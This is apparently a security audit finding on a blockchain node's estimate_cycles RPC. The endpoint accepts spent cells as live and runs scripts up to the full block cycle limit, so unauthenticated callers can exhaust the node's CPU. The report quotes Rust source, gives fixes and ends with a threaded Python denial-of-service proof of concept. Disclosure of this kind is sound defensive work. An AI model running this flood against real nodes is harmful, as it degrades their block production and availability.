### Title
Unauthenticated `estimate_cycles` RPC Allows CPU Exhaustion via Dead-Cell Script Execution at Full `max_block_cycles` — (`rpc/src/module/chain.rs`)

---

### Summary

The `estimate_cycles` RPC endpoint invokes `ScriptVerifier::verify(max_block_cycles)` with no authentication, no per-caller rate limit, and no cycle cap below the consensus maximum. `CyclesEstimator::cell()` explicitly treats every cell — including spent (dead) cells — as live, so `resolve_transaction` always succeeds for any historically-existing out_point. An attacker who can reach the RPC port can submit a transaction referencing a dead cell whose lock script loops to the cycle ceiling, consuming up to ~3.5 B VM cycles of CPU per call, and repeat this in a tight concurrent loop to saturate the node's RPC thread pool and degrade block production.

---

### Finding Description

**Entry point — `estimate_cycles` (line 2119–2122):**

```rust
fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles> {
    let tx: packed::Transaction = tx.into();
    CyclesEstimator::new(&self.shared).run(tx)
}
```

No authentication, no cycle cap, no rate limit. [1](#0-0) 

**Dead-cell bypass — `CyclesEstimator::cell()` (lines 2347–2361):**

```rust
impl<'a> CellProvider for CyclesEstimator<'a> {
    fn cell(&self, out_point: &packed::OutPoint, eager_load: bool) -> CellStatus {
        let snapshot = self.shared.snapshot();
        snapshot
            .get_cell(out_point)
            .map(|mut cell_meta| {
                // ...
                CellStatus::live_cell(cell_meta)
            })  // treat as live cell, regardless of live or dead
            .unwrap_or(CellStatus::Unknown)
    }
}
```

`snapshot.get_cell()` returns cell metadata for any cell that ever existed on-chain (live or spent). The result is unconditionally wrapped in `CellStatus::live_cell(...)`. The comment confirms this is intentional. [2](#0-1) 

**Full `max_block_cycles` passed to verifier — `CyclesEstimator::run()` (lines 2375–2405):**

```rust
let max_cycles = consensus.max_block_cycles;
// ...
ScriptVerifier::new(Arc::new(resolved), ...).verify(max_cycles)
```

On mainnet `max_block_cycles = 0xd09dc300 = 3,500,000,000`. There is no lower cap applied here. [3](#0-2) 

**No per-method rate limiting in RPC config:**

The `Config` struct only exposes `max_request_body_size`, `threads`, and `rpc_batch_limit`. There is no per-method rate limit, no per-IP throttle, and no cycle cap specific to `estimate_cycles`. [4](#0-3) 

---

### Impact Explanation

Each call to `estimate_cycles` with a max-looping script occupies one RPC worker thread for the full VM execution duration (bounded only by `max_block_cycles`). With the default thread pool, a small number of concurrent attackers can saturate all RPC threads. Because the RPC server and the block-assembly path share the same process and CPU resources, sustained saturation increases block-template generation latency, directly harming the node's ability to participate in mining and relay, constituting a liveness/economy attack.

---

### Likelihood Explanation

- The `Chain` module (which includes `estimate_cycles`) is enabled by default.
- Many public nodes and infrastructure providers expose the RPC port externally.
- The attacker needs only a known spent out_point (trivially obtained from any block explorer) and a script that loops — both are freely available on mainnet.
- No authentication, no proof-of-work, no stake is required.
- The dead-cell bypass is explicit and unconditional in the code.

---

### Recommendation

1. **Add a lower cycle cap for `estimate_cycles`**: Use a configurable `max_estimate_cycles` (e.g., `max_block_cycles / 10`) instead of the full `consensus.max_block_cycles`.
2. **Reject dead cells**: In `CyclesEstimator::cell()`, check whether the cell is actually live (not spent) before returning `CellStatus::live_cell`. Return `CellStatus::Dead` or `CellStatus::Unknown` for spent cells to cause `resolve_transaction` to fail fast.
3. **Add per-IP or per-method rate limiting** to the RPC server for compute-heavy endpoints.
4. **Offload verification to a bounded async task** with a timeout so a single slow call cannot hold a thread indefinitely.

---

### Proof of Concept

```python
import requests, threading, json

# Any known-spent out_point on mainnet (obtainable from any block explorer)
DEAD_OUT_POINT = {"tx_hash": "0x<spent_tx_hash>", "index": "0x0"}

# Script that loops to max_block_cycles (pre-deployed or inline via type-id)
LOOP_SCRIPT = {
    "code_hash": "0x<loop_script_code_hash>",
    "hash_type": "data",
    "args": "0x"
}

tx = {
    "version": "0x0",
    "cell_deps": [{"out_point": {"tx_hash": "0x<loop_script_dep>", "index": "0x0"}, "dep_type": "code"}],
    "header_deps": [],
    "inputs": [{"previous_output": DEAD_OUT_POINT, "since": "0x0"}],
    "outputs": [{"capacity": "0x2540be400", "lock": LOOP_SCRIPT, "type": None}],
    "outputs_data": ["0x"],
    "witnesses": ["0x"]
}

def attack():
    while True:
        requests.post("http://<node_rpc>:8114", json={
            "id": 1, "jsonrpc": "2.0",
            "method": "estimate_cycles", "params": [tx]
        })

# Launch concurrent attackers
for _ in range(8):
    threading.Thread(target=attack, daemon=True).start()
```

**Expected result**: Node CPU saturates; block-template generation latency increases proportionally; the node falls behind in block production.

### Citations

**File:** rpc/src/module/chain.rs (L2119-2122)
```rust
    fn estimate_cycles(&self, tx: Transaction) -> Result<EstimateCycles> {
        let tx: packed::Transaction = tx.into();
        CyclesEstimator::new(&self.shared).run(tx)
    }
```

**File:** rpc/src/module/chain.rs (L2347-2361)
```rust
impl<'a> CellProvider for CyclesEstimator<'a> {
    fn cell(&self, out_point: &packed::OutPoint, eager_load: bool) -> CellStatus {
        let snapshot = self.shared.snapshot();
        snapshot
            .get_cell(out_point)
            .map(|mut cell_meta| {
                if eager_load
                    && let Some((data, data_hash)) = snapshot.get_cell_data(out_point) {
                        cell_meta.mem_cell_data = Some(data);
                        cell_meta.mem_cell_data_hash = Some(data_hash);
                    }
                CellStatus::live_cell(cell_meta)
            })  // treat as live cell, regardless of live or dead
            .unwrap_or(CellStatus::Unknown)
    }
```

**File:** rpc/src/module/chain.rs (L2380-2389)
```rust
                let max_cycles = consensus.max_block_cycles;
                let tip_header = snapshot.tip_header();
                let tx_env = TxVerifyEnv::new_submit(tip_header);
                match ScriptVerifier::new(
                    Arc::new(resolved),
                    snapshot.as_data_loader(),
                    consensus,
                    Arc::new(tx_env),
                )
                .verify(max_cycles)
```

**File:** util/app-config/src/configs/rpc.rs (L26-61)
```rust
pub struct Config {
    /// RPC server listen addresses.
    pub listen_address: String,
    /// RPC TCP server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub tcp_listen_address: Option<String>,
    /// RPC WS server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub ws_listen_address: Option<String>,
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
    /// Number of RPC worker threads.
    pub threads: Option<usize>,
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
    /// Enabled RPC modules.
    pub modules: Vec<Module>,
    /// Rejects txs with scripts that might trigger known bugs
    #[serde(default)]
    pub reject_ill_transactions: bool,
    /// Whether enable deprecated RPC methods.
    ///
    /// Deprecated RPC methods are disabled by default.
    #[serde(default)]
    pub enable_deprecated_rpc: bool,
    /// Customized extra well known lock scripts.
    #[serde(default)]
    pub extra_well_known_lock_scripts: Vec<Script>,
    /// Customized extra well known type scripts.
    #[serde(default)]
    pub extra_well_known_type_scripts: Vec<Script>,
}
```
